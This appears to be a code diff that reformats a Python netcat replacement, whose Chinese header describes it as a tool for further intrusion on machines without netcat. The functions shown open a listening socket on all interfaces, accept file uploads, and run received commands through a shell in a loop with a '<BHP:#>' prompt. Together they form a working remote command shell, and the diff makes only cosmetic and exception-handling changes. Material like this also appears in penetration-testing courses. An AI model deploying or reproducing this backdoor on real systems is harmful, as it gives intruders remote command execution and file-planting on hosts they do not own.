@@ -1,7 +1,8 @@
 #!/usr/bin/env python3 
-## -*- coding: utf-8 -*- """ 
-#@author zhangbohan.dell@gmail.com     
-#@function:python程序，取代netcat，通常有些电脑并没有安装netcat，但是安装了python，就可以很好的利用本工具进行进一步入侵     @create 18-4-30 下午9:28"""
+# -*- coding: utf-8 -*-
+# @author zhangbohan.dell@gmail.com
+# @function:python程序，取代netcat，通常有些电脑并没有安装netcat，但是安装了python，就可以很好的利用本工具进行进一步入侵
+# @create  18-4-30 下午9:28
 
 import sys
 import socket
@@ -47,7 +48,7 @@ def client_sender(buffer):
             #         现在等待数据回传
             recv_len = 1
             response = ""
-            while recv_len:      
+            while recv_len:
                 data = client.recv(4096).decode()
                 recv_len = len(data)
                 print(data)
@@ -59,18 +60,18 @@ def client_sender(buffer):
             # 等待更多的输入
             buffer = input("")
             buffer += "\n"
-            #         发送出去
+            # 发送出去
             client.send(buffer.encode())
-    except:
+    except OSError:
         print("[*] Exception ! Exiting.")
-        #     关闭链接
+        # 关闭链接
         client.close()
 
 
 def server_loop():
     global target
 
-#     如果没有定义目标，那么我们监听所有接口
+    #     如果没有定义目标，那么我们监听所有接口
     if not len(target):
         target = "0.0.0.0"
 
@@ -81,7 +82,7 @@ def server_loop():
     while True:
         client_socket, addr = server.accept()
 
-#         分拆一个线程处理新的客户端
+        #         分拆一个线程处理新的客户端
         client_thread = threading.Thread(
             target=client_handle, args=(client_socket,))
         client_thread.start()
@@ -90,14 +91,14 @@ def server_loop():
 def run_command(command):
     #     换行
     command = command.rstrip()
-# 运行命令并返回
+    # 运行命令并返回
     try:
         output = subprocess.check_output(
             command, stderr=subprocess.STDOUT, shell=True)
-    except:
+    except OSError:
         output = "Failed to excute command .\r\n"
 
-#     将输出发送
+    #     将输出发送
     return output
 
 
@@ -105,7 +106,7 @@ def client_handle(client_socket):
     global upload
     global execute
     global command
-#     检测上传文件
+    #     检测上传文件
     if len(upload_destination):
         # 读取所有的字符并写下目标
         file_buffer = ""
@@ -115,7 +116,7 @@ def client_handle(client_socket):
                 break
             else:
                 file_buffer += data
-#     现在我们将接受这些数据并将他们写出来
+    #     现在我们将接受这些数据并将他们写出来
     try:
         file_descriptor = open(upload_destination, "wb")
         file_descriptor.write(file_buffer)
@@ -123,7 +124,7 @@ def client_handle(client_socket):
         # 确认文件已经写出来
         client_socket.send(("Successfully saved file to %s\r\n" %
                             upload_destination).encode())
-    except:
+    except OSError:
         client_socket.send(("Failed to save file to %s\r\n" %
                             upload_destination).encode())
 
@@ -133,18 +134,18 @@ def client_handle(client_socket):
         output = run_command(execute)
         client_socket.send(output.encode())
 
-#         如果需要一个名林你工行shell，那么进入另一个循环
+        #         如果需要一个名林你工行shell，那么进入另一个循环
         if command:
             while True:
                 #                 跳出一个窗口
-                client_socket.send(("<BHP:#>").encode())
-#                 现在我们接受文件知道发现换行符（enter key）
+                client_socket.send("<BHP:#>".encode())
+                #                 现在我们接受文件知道发现换行符（enter key）
                 cmd_buffer = ""
                 while "\n" not in cmd_buffer:
                     cmd_buffer += client_socket.recv(1024).decode()
-#                     返还命令输出
+                #                     返还命令输出
                 response = run_command(cmd_buffer)
-#                 返还相应数据
+                #                 返还相应数据
                 client_socket.send(response.encode())
 
 
